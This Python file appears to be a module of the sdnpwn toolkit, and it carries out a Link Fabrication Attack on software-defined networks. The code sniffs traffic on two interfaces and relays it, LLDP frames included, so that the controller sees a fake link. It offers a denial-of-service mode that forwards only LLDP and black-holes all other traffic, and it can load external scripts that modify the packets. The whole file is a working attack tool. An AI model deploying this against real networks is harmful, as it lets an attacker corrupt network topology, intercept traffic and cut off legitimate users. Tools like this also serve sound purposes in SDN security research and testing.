
import modules.sdnpwn_common as sdnpwn

from scapy.all import *
import sys
import signal
from subprocess import call
from threading import Thread
from time import sleep
import hashlib
import imp
import netifaces

class packetHandler:

   pipeline = None
   iface1 = None
   iface2 = None
   clearToSend = 0
   pktCacheSize = 40
   pktCache1 = []
   pktCache2 = []
   lastLLDP1 = None
   lastLLDP2 = None
   forwardLLDPOnly = False
   

   def __init__(self):
      clearToSend = 0

   def packetIn1(self, pkt):      
     if Ether in pkt:
       if((self.forwardLLDPOnly == False) or (self.forwardLLDPOnly == True and pkt.type == 0x88cc)): #Ethernet packet type 0x88cc is LLDP
         pktHash = hashlib.md5(str(pkt).encode()).hexdigest()
         if(pktHash != self.lastLLDP2):
           self.lastLLDP1 = pktHash
           if(self.pipeline is not None):
             pkt = self.pipeline.run(pkt)
           sendp(pkt, iface=self.iface2)
            
   def packetIn2(self, pkt):
     if Ether in pkt:
       if((self.forwardLLDPOnly == False) or (self.forwardLLDPOnly == True and pkt.type == 0x88cc)): #Ethernet packet type 0x88cc is LLDP
         pktHash = hashlib.md5(str(pkt).encode()).hexdigest()
         if(pktHash != self.lastLLDP1):
           self.lastLLDP2 = pktHash
           if(self.pipeline is not None):
             pkt = self.pipeline.run(pkt)
           sendp(pkt, iface=self.iface1)

def stopSniffing(pkt):
  global runningThreads
  if(len(runningThreads) == 0):
    return True
  else:
    return False
  
def interface1Listener(iface, handler):
  sniff(iface=iface, prn=handler.packetIn1, stop_filter=stopSniffing)

def interface2Listener(iface, handler):
  sniff(iface=iface, prn=handler.packetIn2, stop_filter=stopSniffing)

def signal_handler(signal, frame):
  global runningThreads
  print("\n[!] Stopping...")
  runningThreads.remove(runningThreads[1])
  runningThreads.remove(runningThreads[0]) 
    
        
def info():
  return "Performs the Link Fabrication Attack (LFA) using a Scapy script. This can be extended with a custom script using the --script option."
  
def usage():

  sdnpwn.addUsage("--iface1", "Set network interface 1", True)
  sdnpwn.addUsage("--iface1", "Set network interface 2", True)
  sdnpwn.addUsage("--script", "Pass traffic through a custom script. Provide script location.")
  sdnpwn.addUsage("--dos", "Only forward LLDP traffic and create a 'black hole' for other traffic")
  sdnpwn.addUsage("--verbose", "Get more output")
  
  return sdnpwn.getUsage()

def run(params):
   global runningThreads
   
   runningThreads = []
   
   iface1IPAddress = None
   iface1NetMask = None
   iface2IPAddress = None
   iface2NetMask = None
   defaultGWIP = None
   defaultGWIface = None
   
   externScript = None
   iface1 = None
   iface2 = None
   pipeline = None
   
   if("--verbose" not in params):
      conf.verb = 0 

   if("--iface1" in params):
      iface1 = params[params.index("--iface1")+1]
        
   if("--iface2" in params):
      iface2 = params[params.index("--iface2")+1]
    
   if("--script" in params):
      externScript = params[params.index("--script")+1]
      try:
        pipeline = imp.load_source((externScript.split(".py")[0]).split("/")[-1], externScript)
      except:
        sdnpwn.message("Error. Could not load external script " + externScript, sdnpwn.ERROR)
        return 
      
   sdnpwn.message("Warning: The interfaces will become unavailable for general use during the attack.", sdnpwn.WARNING)
   iface1IPAddress = sdnpwn.getIPAddress(iface1)
   iface1NetMask = sdnpwn.getNetworkMask(iface1)
   iface2IPAddress = sdnpwn.getIPAddress(iface2)
   iface2NetMask = sdnpwn.getNetworkMask(iface2)
   
   try:
     defaultGWIP = netifaces.gateways()['default'][netifaces.AF_INET][0]
     defaultGWIface = netifaces.gateways()['default'][netifaces.AF_INET][1]
   except:
     sdnpwn.message("Could not get default gateway details. Default GW will not be restored after the attack.", sdnpwn.WARNING)
 
   print("[*] Zeroing interfaces..."),
   call(["ifconfig", iface1, "0"])
   call(["ifconfig", iface2, "0"])
   print("Done.")
   sdnpwn.message("Running link fabrication attack using interfaces " + iface1 + " and " + iface2, sdnpwn.NORMAL)
   sdnpwn.message("Press Ctrl+C to stop.", sdnpwn.NORMAL)
   
   signal.signal(signal.SIGINT, signal_handler)
      
   if((iface1 != None) and (iface2 != None)):
      pktHandler = packetHandler()
      pktHandler.iface1 = iface1
      pktHandler.iface2 = iface2
      if(pipeline is not None):
        pktHandler.pipeline = pipeline
      if("--dos" in params):
        pktHandler.forwardLLDPOnly = True
      iface1Thread = Thread(target=interface1Listener, args=(iface1, pktHandler,))
      iface2Thread = Thread(target=interface2Listener, args=(iface2, pktHandler,))
      #iface1Thread.daemon = True
      #iface2Thread.daemon = True
      iface1Thread.setDaemon(True)
      iface2Thread.setDaemon(True)
      runningThreads.append(iface1Thread)
      runningThreads.append(iface2Thread)
      iface1Thread.start()
      iface2Thread.start()
            
      while(len(runningThreads) != 0):
        pass
      
      sdnpwn.message("Restoring interfaces", sdnpwn.NORMAL)
      call(["ifconfig", iface1, iface1IPAddress, "netmask", iface1NetMask])
      call(["ifconfig", iface2, iface2IPAddress, "netmask", iface2NetMask])
      call(["route", "add", "default", "gw", defaultGWIP, defaultGWIface])
      
      sdnpwn.message("Done", sdnpwn.NORMAL)
   else:
      sdnpwn.message("Missing input", sdnpwn.WARNING)
      print(usage())
  